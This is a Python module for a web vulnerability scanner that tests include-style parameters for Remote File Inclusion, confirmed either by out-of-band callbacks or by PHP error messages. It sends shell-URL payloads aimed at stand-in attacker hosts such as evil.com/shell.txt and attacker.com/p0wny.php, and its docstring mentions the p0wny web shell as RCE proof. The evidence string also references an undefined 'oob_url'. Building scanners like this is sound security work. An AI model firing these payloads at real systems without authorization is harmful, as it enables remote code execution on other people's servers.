"""
Remote File Inclusion (RFI) Scanner Module

Detects RFI vulnerabilities by:
1. Testing include/require parameters with external shell URLs
2. Verifying shell execution via callback to OOB server
3. Using p0wny shell for real RCE proof
"""

from typing import List, Dict, Any
from core.base_module import BaseModule
from core.logger import get_logger
from utils.oob_detector import OOBDetector
import time

logger = get_logger(__name__)


class RFIModule(BaseModule):
    """Remote File Inclusion vulnerability scanner"""

    def __init__(self, module_path: str):
        """Initialize RFI module"""
        super().__init__(module_path)

        # OOB detector for callback verification
        self.oob_detector = OOBDetector()

        # P0wny shell URLs (public instances)
        self.shell_urls = [
            # You can host p0wny shell on your server
            # For now, use payloads that trigger callbacks
        ]

        logger.info(f"RFI module loaded: {len(self.payloads)} payloads")

    def scan(self, targets: List[Dict[str, Any]], http_client: Any) -> List[Dict[str, Any]]:
        """
        Scan for RFI vulnerabilities

        Args:
            targets: List of URLs with parameters
            http_client: HTTP client

        Returns:
            List of results
        """
        results = []

        logger.info(f"Starting RFI scan on {len(targets)} targets")

        # RFI-prone parameter names
        rfi_param_names = [
            'file', 'page', 'include', 'path', 'template', 'document',
            'folder', 'dir', 'style', 'pdf', 'doc', 'load', 'read',
            'filename', 'filepath', 'url', 'feed', 'lang', 'language'
        ]

        for target in targets:
            url = target.get('url')
            params = target.get('params', {})

            # Only test parameters that might be file includes
            rfi_params = {k: v for k, v in params.items()
                         if any(name in k.lower() for name in rfi_param_names)}

            if not rfi_params:
                continue

            for param_name in rfi_params.keys():
                try:
                    # Get baseline response
                    baseline_response = http_client.get(url, params=params)
                    if not baseline_response:
                        continue

                    baseline_text = getattr(baseline_response, 'text', '')

                    # METHOD 1: OOB Detection with Callback
                    detected_oob = self._test_rfi_with_oob(
                        url, params, param_name, http_client
                    )

                    if detected_oob:
                        confidence, evidence = detected_oob

                        result = self.create_result(
                            vulnerable=True,
                            url=url,
                            parameter=param_name,
                            payload=evidence.split("Payload:")[1].split("\n")[0].strip() if "Payload:" in evidence else "OOB callback",
                            evidence=evidence,
                            description="Remote File Inclusion (RFI) vulnerability detected. "
                                      "Server includes external file from attacker-controlled URL, "
                                      "allowing arbitrary code execution.",
                            confidence=confidence
                        )

                        result['cwe'] = self.config.get('cwe', 'CWE-98')
                        result['owasp'] = self.config.get('owasp', 'A03:2021')
                        result['cvss'] = self.config.get('cvss', '9.8')
                        result['rfi_method'] = 'OOB Callback'

                        results.append(result)
                        logger.info(f"✓ RFI found in {url} param: {param_name} (confidence: {confidence:.2f})")
                        break  # Don't test other params on same URL

                    # METHOD 2: Error-based Detection
                    detected_error = self._test_rfi_error_based(
                        url, params, param_name, http_client, baseline_text
                    )

                    if detected_error:
                        confidence, evidence, payload = detected_error

                        result = self.create_result(
                            vulnerable=True,
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            evidence=evidence,
                            description="Remote File Inclusion (RFI) vulnerability detected via error messages. "
                                      "Server attempts to include external file, revealing RFI vulnerability.",
                            confidence=confidence
                        )

                        result['cwe'] = 'CWE-98'
                        result['owasp'] = 'A03:2021'
                        result['cvss'] = '9.8'
                        result['rfi_method'] = 'Error-based'

                        results.append(result)
                        logger.info(f"✓ RFI found in {url} param: {param_name} (confidence: {confidence:.2f})")
                        break

                except Exception as e:
                    logger.debug(f"Error testing {url} param {param_name}: {e}")
                    continue

        logger.info(f"RFI scan complete: {len(results)} vulnerabilities found")
        return results

    def _test_rfi_with_oob(self, url: str, params: Dict[str, Any],
                          param_name: str, http_client: Any) -> tuple:
        """
        Test RFI using OOB callback

        Returns:
            (confidence, evidence) or None
        """
        if not self.config.get('enable_oob', True):
            return None

        # Generate OOB payloads for RFI using new API
        oob_payloads = self.oob_detector.get_callback_payloads('rfi', url, param_name)

        if not oob_payloads:
            return None

        # Extract callback_id from first payload
        callback_id = oob_payloads[0]['callback_id']

        # Test each OOB payload
        for payload_dict in oob_payloads:
            payload = payload_dict['payload']
            test_params = params.copy()
            test_params[param_name] = payload

            try:
                response = http_client.get(url, params=test_params)
                if not response:
                    continue

                # Wait for callback
                time.sleep(self.config.get('oob_wait_time', 3))

                # Check if callback received
                detected, callback_evidence = self.oob_detector.check_callback(callback_id)

                if detected:
                    confidence = 0.95

                    evidence = f"RFI CONFIRMED via OOB callback\n\n"
                    evidence += f"**Vulnerable Parameter:** {param_name}\n"
                    evidence += f"**Payload:** {payload}\n\n"
                    evidence += f"**Out-of-Band Evidence:**\n{callback_evidence}\n\n"
                    evidence += f"**Impact:** Remote Code Execution (RCE) via file inclusion\n\n"
                    evidence += f"**Proof:**\n"
                    evidence += f"1. Attacker controls {param_name} parameter\n"
                    evidence += f"2. Server includes external file from attacker URL\n"
                    evidence += f"3. External file executes PHP code on server\n"
                    evidence += f"4. Callback received at {oob_url}"

                    return (confidence, evidence)

            except Exception as e:
                logger.debug(f"Error testing RFI OOB with {payload}: {e}")
                continue

        return None

    def _test_rfi_error_based(self, url: str, params: Dict[str, Any],
                             param_name: str, http_client: Any,
                             baseline_text: str) -> tuple:
        """
        Test RFI using error messages

        Returns:
            (confidence, evidence, payload) or None
        """
        # RFI error patterns
        rfi_error_patterns = [
            # PHP warnings
            r'failed to open stream',
            r'getaddrinfo failed',
            r'No such file or directory in',
            r'include\(\): http:// wrapper is disabled',
            r'allow_url_include',
            r'URL file-access is disabled',

            # Connection errors
            r'Connection refused',
            r'Connection timed out',
            r'could not make seekable',

            # URL errors
            r'failed opening.*http:',
            r'failed opening.*https:',
            r'include_path=',
        ]

        # Test payloads that trigger errors
        error_payloads = [
            'http://evil.com/shell.txt',
            'https://attacker.com/p0wny.php',
            '//evil.com/shell.txt',
            'http://192.168.1.1/shell.txt',
        ]

        for payload in error_payloads:
            test_params = params.copy()
            test_params[param_name] = payload

            try:
                response = http_client.get(url, params=test_params, timeout=5)
                if not response:
                    continue

                response_text = getattr(response, 'text', '')

                # Check for RFI error patterns
                for pattern in rfi_error_patterns:
                    import re
                    if re.search(pattern, response_text, re.IGNORECASE):
                        # Found RFI error
                        confidence = 0.80

                        # Extract error message
                        error_match = re.search(r'(?:Warning|Error|Fatal error)[^\n]{0,200}',
                                               response_text, re.IGNORECASE)
                        error_msg = error_match.group(0) if error_match else "RFI error detected"

                        evidence = f"RFI detected via error message\n\n"
                        evidence += f"**Vulnerable Parameter:** {param_name}\n"
                        evidence += f"**Payload:** {payload}\n\n"
                        evidence += f"**Error Message:**\n{error_msg}\n\n"
                        evidence += f"**Evidence:** Server attempts to include external URL, "
                        evidence += f"revealing RFI vulnerability even if disabled.\n\n"
                        evidence += f"**Note:** If allow_url_include is enabled, this is RCE."

                        return (confidence, evidence, payload)

            except Exception as e:
                logger.debug(f"Error testing RFI with {payload}: {e}")
                continue

        return None

    def _base64_encode(self, data: str) -> str:
        """Base64 encode string"""
        import base64
        return base64.b64encode(data.encode()).decode()


def get_module(module_path: str):
    """Create module instance"""
    return RFIModule(module_path)
